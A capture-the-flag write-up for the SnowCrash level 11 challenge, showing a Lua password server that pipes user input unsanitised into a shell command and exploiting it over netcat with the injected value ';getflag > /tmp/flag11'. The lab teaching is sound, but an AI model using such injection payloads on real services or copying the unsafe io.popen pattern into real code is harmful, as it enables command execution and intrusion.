We start by exploring the files and find a Lua script named `level11.lua`.

```
level11@SnowCrash:~$ ls
level11.lua
```

Examining the contents of `level11.lua` reveals a server script that listens on `127.0.0.1:5151` and asks for a password.

```
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end

  client:close()
end
```

---

### Explanation of the Code

1. **Server Setup**:

   - The script creates a server on `127.0.0.1:5151` and waits for a client to connect.
   - Once connected, the client receives a "Password:" prompt and can submit input as a password.

2. **The `hash` Function and Vulnerability**:

   - The `hash` function is designed to hash the user input with SHA-1.
   - It calls `io.popen("echo "..pass.." | sha1sum", "r")`, which runs `echo <input> | sha1sum` in the shell.
   - Because `pass` is concatenated directly into the shell command, we can inject arbitrary commands instead of a password.

3. **Executing Commands with Command Injection**:
   - By entering a password like `;getflag`, we terminate the `echo` command and add our command (`getflag`) afterward.
   - Since we don't see direct output from the server, we need to **redirect** the output to a file.

---

### Exploit Steps

1. **Setting Up a Netcat Connection**:

   - We connect to the server on `127.0.0.1:5151` with `nc`:

   ```
   level11@SnowCrash:~$ nc 127.0.0.1 5151
   Password: test
   Erf nope..
   ```

2. **Injecting the Exploit Command**:

   - Instead of a password, we send `;getflag > /tmp/flag11` to inject the `getflag` command and save the output in `/tmp/flag11`:

   ```
   level11@SnowCrash:~$ nc 127.0.0.1 5151
   Password: ;getflag > /tmp/flag11
   Erf nope..
   ```

3. **Retrieving the Flag**:

   - We check `/tmp/flag11` for the output of `getflag`:

   ```
   level11@SnowCrash:~$ cat /tmp/flag11
   Check flag.Here is your token :
   ```

---

This completes the exploit for Level11.
